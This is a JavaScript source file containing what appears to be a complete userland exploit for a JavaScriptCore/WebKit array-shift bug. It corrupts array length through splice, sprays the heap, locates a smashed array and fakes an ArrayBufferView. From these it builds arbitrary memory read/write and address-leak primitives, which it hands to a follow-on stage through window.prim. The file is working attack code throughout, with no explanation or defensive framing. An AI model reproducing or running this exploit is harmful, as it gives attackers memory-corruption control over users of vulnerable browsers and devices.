function exploit_shiftCountWithArrayStorage() {
	
	// Userland pwnage
	try {
		var structs = [];
		
		// May need configuration depending on system? Left it as a variable just in case
		var sprayMax = 0x400;
		
		//alert("---------- Phase 1: Obtaining Relative R/W Primitive ----------");

		// Setup the corrupted arr for OOB write
		//alert("[*] Setting up the attack array...");

		var arr = [1];

		arr.length = 0x100000;
		arr.splice(0, 0x11);

		arr.length = 0xfffffff0;

		// Spray some target butterflies in CopiedSpace
		//alert("[*] Spraying target objects on the heap...");

		var targetButterflies = [];

		for (var i = 0; i < sprayMax; i++) {
			targetButterflies[i] = [];

			targetButterflies[i].p0 = 0.0;
			targetButterflies[i].p1 = 0.1;
			targetButterflies[i].p2 = 0.2;
			targetButterflies[i].p3 = 0.3;
			targetButterflies[i].p4 = 0.4;
			targetButterflies[i].p5 = 0.5;
			targetButterflies[i].p6 = 0.6;
			targetButterflies[i].p7 = 0.7;
			targetButterflies[i].p8 = 0.8;
			targetButterflies[i].p9 = 0.9;

			for (var k = 0; k < 0x10; k++) // We want to smash the length of the array to the max possible value
				targetButterflies[i][k] = u2d(0x7FFFFFFF, 0x7FEFFFFF);
		}

		//alert("[*] Triggering memory corruption....");

		// Trigger shift of memory contents to cause OOB write on a sprayed array
		arr.splice(0x1000, 0x0, 1);

		var targetIdx = -1;

		//alert("[*] Finding corrupted ArrayWithDouble for rel R/W...");

		for (var i = 0; i < sprayMax; i++) {
			if (targetButterflies[i].length != 0x10) {
				//alert("[*] Found smashed butterfly!");
				//alert("|   [+] Index: 0x" + i.toString(16));
				//alert("|   [+] Length: 0x" + targetButterflies[i].length.toString(16));

				targetIdx = i;
				break;
			}
		}

		if (targetIdx == -1) {
			//alert("[-] Failed to find smashed butterfly.");
			location.reload();
			return;
		}

		// We now have an ArrayWithDoubles that can r/w OOB
		var oobDoubleArr = targetButterflies[targetIdx];

		//alert("---------- Phase 2: Obtaining Arbitrary R/W Primitive ----------");

		// Spray some objects to use for arb. R/W primitive
		//alert("[*] Spraying ArrayWithContiguous objects...");

		var primitiveSpray = [];

		for (var i = 0; i < 0x800; i++) {
			primitiveSpray[i] = [];
			for (var k = 0; k < 0x10; k++) {
				primitiveSpray[i].p0 = u2d(0x13371337, 0x0);
				primitiveSpray[i].p1 = u2d(0x13371337, 0x0);
				primitiveSpray[i].p2 = u2d(0x13371337, 0x0);
				primitiveSpray[i].p3 = u2d(0x13371337, 0x0);
				primitiveSpray[i].p4 = u2d(0x13371337, 0x0);
				primitiveSpray[i].p5 = u2d(0x13371337, 0x0);
				primitiveSpray[i].p6 = u2d(0x13371337, 0x0);
				primitiveSpray[i].p7 = u2d(0x13371337, 0x0);
				primitiveSpray[i].p8 = u2d(0x13371337, 0x0);
				primitiveSpray[i].p9 = u2d(0x13371337, 0x0);

				if (k == 0)
					primitiveSpray[i][k] = 13.37;
				else
					primitiveSpray[i][k] = {};
			}
		}

		//alert("[*] Finding potential primitive...");

		var leakAndFakePrimIdx = -1;
		var leakAndFakeDoubleIdx = -1;
		var foundPrimitive = false;

		for (var i = 0; i < 0x5000; i++) {
			var lookupIdx = 0x65000 + i;
			var oldVal = oobDoubleArr[lookupIdx];

			if (oldVal == undefined)
				continue;

			oobDoubleArr[lookupIdx] = u2d(0x00001337, 0x0);

			for (var k = 0; k < 0x800; k++) {
				if (primitiveSpray[k].length != 0x10) {
					//alert("[*] Found a primitive!")
					//alert("|   [+] Primitive Index: 0x" + k.toString(16));
					//alert("|   [+] Double Index: 0x" + lookupIdx.toString(16));
					//alert("|   [+] Length: 0x" + primitiveSpray[k].length.toString(16));

					foundPrimitive = true;
					leakAndFakePrimIdx = k;
					leakAndFakeDoubleIdx = lookupIdx;

					oobDoubleArr[lookupIdx] = oldVal;

					//for (var test = 0; test < 0x10; test++)
						//new int64 (d2u(oobDoubleArr[lookupIdx + test]).low, d2u(oobDoubleArr[lookupIdx + test]).hi);

					break;
				}
			}

			if (foundPrimitive)
				break;

			oobDoubleArr[lookupIdx] = oldVal;
		}
		
		if (!foundPrimitive) {
			//alert("[-] Failed to find primitive.");
			location.reload();
			return;
		}

		var slave = new Uint32Array(0x1000);

		slave[0] = 0x13371337;

		// First, leak the address of an array we'll use later for leaking arbitrary JSValues
		//alert("[*] Leaking address of array for leak primitive...");

		var leakTgt = {a: 0, b: 0, c: 0, d: 0};
		leakTgt.a = slave;

		primitiveSpray[leakAndFakePrimIdx][1] = leakTgt;

		var leakTargetAddr = oobDoubleArr[leakAndFakeDoubleIdx + 2];
		var leakTargetAddrInt64 = new int64 (d2u(leakTargetAddr).low, d2u(leakTargetAddr).hi);

		// Second, leak the address of an array we'll use for faking an ArrayBufferView via inline properties
		//alert("[*] Leaking address of fake ArrayBufferView for R/W primitive...");

		// Spray arrays for structure id
		for (var i = 0; i < 0x100; i++) {
			var a = new Uint32Array(1);
			a[Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5)] = 1337;
			structs.push(a);
		}

		// Target JSObject for overlap
		var rwTgt = {a: 0, b: 0, c: 0, d: 0};

		// Setup fake ArrayBufferView
		rwTgt.a = u2d(0x00000200, 0x01602300);
		rwTgt.b = 0;
		rwTgt.c = slave;
		rwTgt.d = 0x1337;

		primitiveSpray[leakAndFakePrimIdx][1] = rwTgt;

		var rwTargetAddr = oobDoubleArr[leakAndFakeDoubleIdx + 2];
		var rwTargetAddrInt64 = new int64 (d2u(rwTargetAddr).low, d2u(rwTargetAddr).hi);

		//alert("|   [+] R/W Target Address: 0x" + rwTargetAddrInt64.toString(16));

		// Address + 0x10 = inline storage, so it will be the address of our fake ArrayBufferView
		rwTargetAddrInt64 = rwTargetAddrInt64.add32(0x10);
		
		// Write this fake object address into oobDoubleArr[leakAndFakeDoubleIdx + 2] to retrieve the handle via primitiveSpray
		oobDoubleArr[leakAndFakeDoubleIdx + 2] = u2d(rwTargetAddrInt64.low, rwTargetAddrInt64.hi);
		
		var master = primitiveSpray[leakAndFakePrimIdx][1];
		
		var addr_to_slavebuf = new int64(master[4], master[5]);
		
		var prim = {
			write8: function (addr, val) {
				master[4] = addr.low;
				master[5] = addr.hi;

				if (val instanceof int64) {
					slave[0] = val.low;
					slave[1] = val.hi;
				} else {
					slave[0] = val;
					slave[1] = 0;
				}
				
				master[4] = addr_to_slavebuf.low;
				master[5] = addr_to_slavebuf.hi;
			},

			write4: function (addr, val) {
				master[4] = addr.low;
				master[5] = addr.hi;
				
				slave[0] = val;
				
				master[4] = addr_to_slavebuf.low;
				master[5] = addr_to_slavebuf.hi;
			},

			read8: function (addr) {
				master[4] = addr.low;
				master[5] = addr.hi;
				
				var rtv = new int64(slave[0], slave[1]);
				
				return rtv;
			},

			read4: function (addr) {
				master[4] = addr.low;
				master[5] = addr.hi;

				var rtv = slave[0];
				
				return rtv;
			},

			leakval: function (jsval) {
				leakTgt.a = jsval;
				return this.read8(leakTargetAddrInt64.add32(window.leakval_slide));
			}
		};
		
		window.prim = prim;
		if (window.postExpl)
			window.postExpl();
	} catch(e) {
		failed = true;
		fail("Exception: " + e);
	}
}